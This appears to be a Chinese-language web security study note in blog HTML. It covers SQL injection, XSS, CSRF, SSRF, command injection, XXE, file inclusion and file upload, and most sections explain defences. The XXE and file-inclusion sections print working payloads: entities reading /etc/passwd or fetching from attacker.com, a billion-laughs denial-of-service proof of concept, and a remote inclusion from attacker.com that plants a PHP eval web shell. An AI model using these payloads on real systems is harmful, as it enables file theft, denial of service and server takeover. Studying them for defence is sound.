+<h3 id="二次注入漏洞"><a href="#二次注入漏洞" class="headerlink" title="二次注入漏洞"></a>二次注入漏洞</h3><ol>
+<li>攻击者在http请求中提交恶意输入；</li>
+<li>恶意输入保存在数据库中；</li>
+<li>攻击者提交第二次http请求；</li>
+<li>为处理第二次http请求，程序在检索存储在数据库中的恶意输入，构造SQL语句；</li>
+<li><p>如果攻击成功，在第二次请求响应中返回结果。</p>
+<p>就是第一步注入的数据保存在数据库中，被用来带入第二次查询的语句中，造成了sql注入漏洞。<br>一阶SQL注入和二阶SQL注入危害一致，攻击者获得数据库的访问权限，窃取相关数据，但是一阶SQL注入可以通过相关工具扫描出来，<br>而二阶SQL注入更微妙，通常二阶SQL注入漏洞的测试主要依据测试人员对系统功能的理解和对常出错位置经验的判断，但是应用功能的增加，经验的测试结果并不能保证测试结果。</p>
+</li>
+</ol>
+<p>二阶SQL注入原理讲解<br>　　假设一个网站数据库中存在一个用户名为：“admin”，密码为：“123456”。攻击者注册用户名为：“admin’– ”，密码为：“123”；程序中的代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String name=StringEscapeUtiles.escapeSql(request.getParameter(&quot;Name&quot;));</span><br><span class="line">String pwd=StringEscapeUtiles.escapeSql(request.getParameter(&quot;pwd&quot;));</span><br><span class="line">String sql1=&quot;insert into user(username,password) values (&quot;name&quot;,&quot;pwd&quot;)&quot;;</span><br></pre></td></tr></table></figure></p>
+<p>　　程序在把输入数据存入数据库之前，对输入的数据中的单引号进行了转义来防止恶意输入对对数据库中数据带来的影响，避免了一阶注入带来的问题，但是在数据库中存入的用户名任然为：“admin’– ”。现在攻击者要更新密码，程序会首先判断用户是否存在，代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String name=StringEscapeUtiles.escapeSql(request.getParameter(&quot;Name&quot;));</span><br><span class="line">String oldpwd=StringEscapeUtiles.escapeSql(request.getParameter(&quot;oldpwd&quot;));</span><br><span class="line">String newpwd=StringEscapeUtiles.escapeSql(request.getParameter(&quot;newpwd&quot;));　　</span><br><span class="line">String sql2 = &quot;select * from user where username=&quot;name&quot; and password=&quot;oldpwd&quot;&quot;;</span><br></pre></td></tr></table></figure></p>
+<p>　　确认用户存在且密码正确时，应用程序执行更新密码语句：<br><code>sql3=&quot;update user set password=&quot;newpwd&quot; where username=&quot;username&quot;&quot;;</code><br>　　在数据库中执行语句为：<br><code>update user set password =“111111” where username=&#39;admin&#39;-- &#39;</code><br>　　在数据库语句这种“– ”表示注释，因此“– ”后面的语句不会执行；最终攻击者改变的不是“admin’– ”的密码，而是admin的密码，从而实现攻击。</p>
+<p>Server 注入：只对 GET POST COOKIE进行addslashes，没有对server进行转义。那么SERVER变量就可以被注入了。<br>QUERY_STRING，X_FORWARDED_FOR，CLIENT_IP，CLIENT_IP，HTTP_HOST</p>
+<h2 id="二-XSS脚本攻击"><a href="#二-XSS脚本攻击" class="headerlink" title="二.  XSS脚本攻击"></a>二.  XSS脚本攻击</h2><p>XSS（cross-site scripting跨域脚本攻击）攻击是最常见的Web攻击，其重点是“跨域”和“客户端执行”</p>
+<h3 id="Reflected-XSS（反射型XSS）"><a href="#Reflected-XSS（反射型XSS）" class="headerlink" title="Reflected XSS（反射型XSS）"></a>Reflected XSS（反射型XSS）</h3><p>基于反射的XSS攻击，主要依靠站点服务端返回脚本，在客户端触发执行从而发起Web攻击。<br>安全防范：</p>
+<ol>
+<li>前端在显示服务端数据时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。</li>
+<li>后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。</li>
+</ol>
+<h3 id="Stored-XSS（存储型XSS）"><a href="#Stored-XSS（存储型XSS）" class="headerlink" title="Stored XSS（存储型XSS）"></a>Stored XSS（存储型XSS）</h3><p>通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。<br>开发安全措施：</p>
+<ol>
+<li>首要是服务端要进行过滤，因为前端的校验可以被绕过。</li>
+<li>当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转换成HTML编码。</li>
+</ol>
+<h3 id="DOM-based-or-local-XSS"><a href="#DOM-based-or-local-XSS" class="headerlink" title="DOM-based or local XSS"></a>DOM-based or local XSS</h3><p>未总结</p>
+<h2 id="三-CSRF跨站点请求伪造-Cross—Site-Request-Forgery"><a href="#三-CSRF跨站点请求伪造-Cross—Site-Request-Forgery" class="headerlink" title="三.  CSRF跨站点请求伪造(Cross—Site Request Forgery)"></a>三.  CSRF跨站点请求伪造(Cross—Site Request Forgery)</h2><p>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
+<ol>
+<li>用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</li>
+<li>在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</li>
+<li>用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；</li>
+<li>网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</li>
+<li>浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</li>
+</ol>
+<p>最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
+<h3 id="防御CSRF攻击："><a href="#防御CSRF攻击：" class="headerlink" title="防御CSRF攻击："></a>防御CSRF攻击：</h3><p>目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。</p>
+<h4 id="（1）验证-HTTP-Referer-字段"><a href="#（1）验证-HTTP-Referer-字段" class="headerlink" title="（1）验证 HTTP Referer 字段"></a>（1）验证 HTTP Referer 字段</h4><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆</a> bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。<br>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。<br>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。<br>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
+<h4 id="（2）在请求地址中添加-token-并验证"><a href="#（2）在请求地址中添加-token-并验证" class="headerlink" title="（2）在请求地址中添加 token 并验证"></a>（2）在请求地址中添加 token 并验证</h4><p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。<br>这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <a href="http://url?csrftoken=tokenvalue。" target="_blank" rel="noopener">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上 <input type="”hidden”" name="”csrftoken”" value="”tokenvalue”/">，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。<br>该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p>
+<h4 id="（3）在-HTTP-头中自定义属性并验证"><a href="#（3）在-HTTP-头中自定义属性并验证" class="headerlink" title="（3）在 HTTP 头中自定义属性并验证"></a>（3）在 HTTP 头中自定义属性并验证</h4><p>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。<br>然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p>
+<h2 id="四-SSRF服务器端请求伪造"><a href="#四-SSRF服务器端请求伪造" class="headerlink" title="四.  SSRF服务器端请求伪造"></a>四.  SSRF服务器端请求伪造</h2><p>Ssrf是攻击者构造形成由服务端发起请求的一个安全漏洞。SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。<br>比较容易出问题的点：</p>
+<ol>
+<li>分享：通过URL地址分享网页内容</li>
+<li>转码服务</li>
+<li>在线翻译</li>
+<li>图片加载与下载：通过URL地址加载或下载图片</li>
+<li>图片、文章收藏功能</li>
+<li>未公开的api实现以及其他调用URL的功能</li>
+<li>从URL关键字中寻找</li>
+</ol>
+<p>因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞<br>在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p>
+<h3 id="防范："><a href="#防范：" class="headerlink" title="防范："></a>防范：</h3><p>通过对这些服务器可访问的资源访问做限制，并且过滤用户的输入。</p>
+<h3 id="过滤的绕过"><a href="#过滤的绕过" class="headerlink" title="过滤的绕过"></a>过滤的绕过</h3><p>Ip地址转换成进制<br><a href="http://www.baidu.com@192.168.0.1/" target="_blank" rel="noopener">http://www.baidu.com@192.168.0.1/</a></p>
+<p>在网络上存在一个很神奇的服务，<a href="http://xip.io" target="_blank" rel="noopener">http://xip.io</a> 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。<br>由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。</p>
+<p>GOPHER协议：通过GOPHER我们在一个URL参数中构造Post或者Get请求，从而达到攻击内网应用的目的<br>File协议：File协议主要用于访问本地计算机中的文件，我们可以通过类似file:///文件路径这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。</p>
+<h2 id="五-命令执行漏洞："><a href="#五-命令执行漏洞：" class="headerlink" title="五.  命令执行漏洞："></a>五.  命令执行漏洞：</h2><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。<br>PHP可调用外部程序的常见函数：system,exec,shell_exec,passthru,popen,proc_popen<br>成因分类：<br>1.代码层过滤不严格：<br>商业应用需要执行命令，商业应用的一些核心代码可能封住在二进制文件当中，在web应用中通过system函数调用。<br>system(“/bin/program –arg $arg”)<br>2.调用第三方组件存在的代码执行漏洞：<br>如wordpress，可以选择imagemagick这个常用的图片处理组件，处理用户上传图片时造成命令执行<br>JAVA中 struts2/elasticsearch groovy等<br>3系统自身的漏洞–&gt;bash破壳漏洞（CVE-2014-6271）</p>
+<p>渗透中使最可靠的方法使用时间延迟推断，类似与盲注的方法。<br>windows支持：&amp;&amp;,&amp;,||（哪条名令为真执行那条）<br>linux支持：&amp;&amp;,&amp;,||（执行为真） | （执行后面的语句）</p>
+<p>修复方案：<br>尽量使用脚本解决工作，少用执行命令函数，php中禁止disable_functions<br>程序参数的情况，escapshellcmd过滤<br>程序参数值的情况，escapeshellarg过滤<br>参数值尽量使用引用号包裹，并在拼接前调用addslashes进行转义</p>
+<h2 id="六-XXE-XML-外部实体注入"><a href="#六-XXE-XML-外部实体注入" class="headerlink" title="六.  XXE XML 外部实体注入"></a>六.  XXE XML 外部实体注入</h2><p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进⾏行处理时引发的安全问题。<br>实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题.<br>XML中entity的定义语法为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE filename</span><br><span class="line">[</span><br><span class="line">&lt;!ENTITY entity-name &quot;entity-content&quot;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p>
+<p>如果要引用一个外部资源,可以借助各种协议 几个例子:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///path/to/file.ext</span><br><span class="line">http://url/file.ext</span><br><span class="line">php://filter/read=convert.base64-encode/resource=conf.php</span><br></pre></td></tr></table></figure></p>
+<p>一个简单的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;</span><br><span class="line">&lt;/methodcall&gt;</span><br></pre></td></tr></table></figure></p>
+<p>亦可读取网站内容:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://attacker.com/text.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;</span><br><span class="line">&lt;/methodcall&gt;</span><br></pre></td></tr></table></figure></p>
+<p>如果包含文件失败,可能是由于读取php等文件时文件本身包含的&lt;等字符.可以使用Base64编码绕过,如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;</span><br><span class="line">&lt;/methodcall&gt;</span><br></pre></td></tr></table></figure></p>
+<p>攻击<br>借助XXE,有几种可用且公开的攻击方式:</p>
+<p>拒绝服务<br>POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line">&lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
+<p>POC中中先定义了lol实体，值为”lol”的字符串,后在下面又定义了lol2实体，lol2实体引用10个lol实体，lol3又引用了10个lol2实体的值，依此类推，到了最后在lolz元素中引用的lol9中，就会存在上亿个”lol”字符串此时解析数据时未做特别处理，即可能造成拒绝服务攻击。<br>此外还有一种可能造成拒绝服务的Payload,借助读取/dev/random实现.<br>内网信息<br>借助各种协议如http,XXE可以协助扫描内网,可能可以访问到内网开放WEB服务的Server,并获取其他信息<br>文件读取</p>
+<p>最常规也是最有效的利用思路</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;</span><br><span class="line">&lt;/methodcall&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol>
+<li>检查所使用的底层xml解析库，默认禁止外部实体的解析</li>
+<li>使用第三方应用代码及时升级补丁</li>
+<li>同时增强对系统的监控，防止此问题被人利用<br>对于PHP,由于simplexml_load_string函数的XML解析问题出在libxml库上,所以加载实体前可以调用这样一个函数</li>
+</ol>
+<h3 id="六-文件包含漏洞"><a href="#六-文件包含漏洞" class="headerlink" title="六.  文件包含漏洞"></a>六.  文件包含漏洞</h3><p>include() , include_once() , require_once() , fopen() , readfile() ，<br>只要文件内容符合PHP语法规范，那么任何扩展名都可以被PHP解析。包含非PHP语法规范源文件时，将会暴露其源代码。<br>本地包含：本地包含故名思议，就是在网站服务器的本身存在恶意文件，然后本地包含使用。<br>要想成功利用文件包含漏洞，需要满足下面两个条件：<br>1.include()等函数通过动态变量的方式引入需要包含的文件。<br>2.用户能够控制该动态变量</p>
+<p>include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行<br>require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本<br>include_once()和require_once()：若文件中代码已被包含则不会再次包含<br>远程包含：远程包含，就是调用其他网站的恶意文件进行打开。远程包含，要保证php.ini中allow_url_fopen和allow_url_include要为On，也就是打开状态。如果PHP的配置选项allow_url_include为ON的话，则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞。</p>
+<p>1.读取敏感文件<br>访问URL：<a href="http://www.xxser.com/index.php?page=/etc/passwd" target="_blank" rel="noopener">http://www.xxser.com/index.php?page=/etc/passwd</a><br>如果目标主机文件存在，并且有相应的权限，那么就可以读出文件的内容。反之，就会得到一个类似于;open_basedir restriction in effect的警告。<br>2.远程包含Shell<br>如果目标主机allow_url_fopen选项是激活的，就可以尝试远程包含一句话木马，如：<a href="http://www.attacker.com/echo.txt，代码如下：" target="_blank" rel="noopener">http://www.attacker.com/echo.txt，代码如下：</a><br>&lt;?php fputs(fopen(“shell.php”,”w”),”&lt;?php eval(\$_POST[xxser]);?&gt;”);?&gt;<br>访问：<a href="http://www.example.com/index.php?page=http://www.attacker.com/echo.txt。将会在index.php所在的目录下生成shell.php，内容为：" target="_blank" rel="noopener">http://www.example.com/index.php?page=http://www.attacker.com/echo.txt。将会在index.php所在的目录下生成shell.php，内容为：</a><br>&lt;?php eval($_POST[xxser]);?&gt;<br>3.本地包含配合文件上传<br>假设已经上传一句话图片木马到服务器，路径为：/uploadfile/xxx.jpg<br>图片代码如下：&lt;?php fputs(fopen(“shell.php”,”w”),”&lt;?php eval(\$_POST[xxser]);?&gt;”);?&gt;<br>访问URL：<a href="http://www.example.com/index.php?page=./uploadfile/xxx.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php。" target="_blank" rel="noopener">http://www.example.com/index.php?page=./uploadfile/xxx.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php。</a><br>4.使用PHP封装协议<br>4.1 使用封装协议读取PHP文件<br>例子如下：<a href="http://www.example.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php" target="_blank" rel="noopener">http://www.example.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php</a><br>访问URL，得到经过Base64加密后的字符串，这段代码就是Base64加密过后的PHP源代码，解密后就可得到原本的“样貌”。<br>4.2 写入PHP文件<br>在allow_url_include为On时，构造URL：<a href="http://www.example.com/index.php?page=php://input，并且提交数据为：" target="_blank" rel="noopener">http://www.example.com/index.php?page=php://input，并且提交数据为：</a>&lt;?php system(‘net user’);?&gt;<br>会得到net user命令的结果。<br>5.包含Apache日志文件<br>本地文件包含的利用。<br>Apache有两个日志文件：access.log（访问日志）和error.log（错误日志）。<br>攻击者先访问<a href="http://www.example.com/" target="_blank" rel="noopener">http://www.example.com/</a>&lt;?php phpinfo();?&gt;,操作这一步时，需要Burp，否则&lt;,&gt;,空格都会被转码。<br>随后访问<a href="http://www.xxser.com/index.php?page=./../Apache-20/logs/access.log" target="_blank" rel="noopener">http://www.xxser.com/index.php?page=./../Apache-20/logs/access.log</a><br>使用这种方式时，找到Apache的路径是关键。<br>6.截断包含<br>&lt;?php<br>if(isset($_GET[‘page’])){<br>include $_GET[‘page’].”.php”;<br>}else{<br>include ‘home.php’;<br>}<br>?&gt;<br>如果此时存在一个图片木马，名为1.jpg，可以输入如下URL：<a href="http://www.example.com/index.php?page=1.jpg%00" target="_blank" rel="noopener">http://www.example.com/index.php?page=1.jpg%00</a><br>当然这种方法只适用于magic_quotes_gpc=Off的情况下。<br>7.绕过WAF防火墙<br>图片木马一般不会被web杀毒软件查出来。<br>四、防御方法<br>1.严格判断包含的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点就在于被包含的文件是否可被外部控制；<br>2.路径限制：限制被包含的文件只能在某一文件夹内，一定要禁止目录跳转字符，如：“../”；<br>3.包含文件验证：验证被包含的文件是否是白名单中的一员；<br>4.尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include(“head.php”);。<br>后记<br>include和require语句是相同的，除了错误处理方面：<br>reuqire会生成致命错误（E_COMPILE_ERROR）并停止脚本<br>include只生成错误报告（E_WARING），并且脚本会继续<br>require和require_once的差别是，require重复调用会多次加载你引用的文件，而require_once只加载一次，而不管你实际上调用了多少次，主要用于复杂的文件包含关系。<br>include和include_once的差别也可以以此类推。</p>
+<h2 id="八-文件上传漏洞"><a href="#八-文件上传漏洞" class="headerlink" title="八.  文件上传漏洞"></a>八.  文件上传漏洞</h2><p>   文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力<br>文件上传后导致的常见安全问题一般有:</p>
+<ol>
+<li>上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行。</li>
+<li>上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为（其他通过类似方式控制策略文件的情况类似);</li>
+<li>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。</li>
+<li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</li>
+</ol>
